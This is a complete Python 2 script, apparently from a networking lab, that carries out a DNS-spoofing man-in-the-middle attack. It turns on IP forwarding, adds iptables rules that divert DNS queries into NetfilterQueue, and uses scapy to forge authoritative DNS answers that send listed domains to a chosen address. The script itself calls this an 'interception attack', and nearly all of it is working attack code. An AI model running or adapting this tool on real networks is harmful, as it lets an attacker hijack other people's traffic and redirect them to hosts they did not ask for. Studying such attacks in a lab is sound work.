#Run this on vm1 with sudo privileges and python2.
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

dns_hosts = { #This is the blacklist of sites the client cannot visit.
    b"shueISP.com.": "10.21.8.3",
    b"shueISP.shueISP.com": "10.21.8.3"
}

def print_and_accept(raw_pkt):
    payload = raw_pkt.get_payload()
    pkt = IP(payload)
    
    if not pkt.haslayer(DNSQR): #If packet is not a DNS query
        print("Packet does not have a DNS query.")
        #print(pkt[DNS].show())
        send(pkt,verbose=0,iface="ens3")
        print("Forwarded packet")
        #raw_pkt.accept()
    else:
        print("Got DNS request for " + str(pkt[DNS].qd.qname))
        qname = pkt[DNSQR].qname
        if qname not in dns_hosts:
            print("Packet is not a threat to Bombast")
            #print(pkt[DNS].show())
            send(pkt,verbose=0,iface="ens3")
            print("Forwarded packet")
            #raw_pkt.accept()
        else:
            #print("Before:")
            #print(pkt[DNS].show())
            #Create new packet
            print("Creating a new packet")
            spoofPacket = IP(dst = pkt[IP].src, src=pkt[IP].dst)/UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd, an = DNSRR(rrname = pkt[DNS].qd.qname, ttl=10, rdata = dns_hosts[qname]))
            print("Spoofed packet made.")
            #print(pkt[DNS].show())
            raw_pkt.set_payload(bytes(spoofPacket))
            print("Set payload for new packet")
            send(spoofPacket,verbose=0,iface="ens3")
            print("Sent spoofed packet")
            #raw_pkt.accept()

def main():
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("route add default gw 10.21.8.1")
    os.system("route add 10.21.9.2 gw 10.21.8.1")
    os.system("route add 10.21.8.3 gw 10.21.8.1")
    os.system("iptables -t nat -A PREROUTING -p UDP --dport 53 -j NFQUEUE --queue-num 1 -i ens3")
    os.system("iptables -A FORWARD -o ens3 -j ACCEPT")
    os.system("iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i ens3 -j ACCEPT")

    #os.system("iptables -I INPUT -d 10.21.8.3 -j NFQUEUE --queue-num 1")
    nfQueue = NetfilterQueue()
    nfQueue.bind(1, print_and_accept)
    try:
        print("Running interception attack...")
        nfQueue.run()
    except KeyboardInterrupt:
        print("Resetting iptables and stopping the interceptor...")
        nfQueue.unbind()
        """
        os.system("sysctl -w net.ipv4.ip_forward=0")
        os.system("iptables -F")
        os.system("iptables -X")
        os.system("iptables -t nat -F")
        os.system("iptables -t nat -X")"""
        exit(0)
if __name__ == '__main__':
    main()
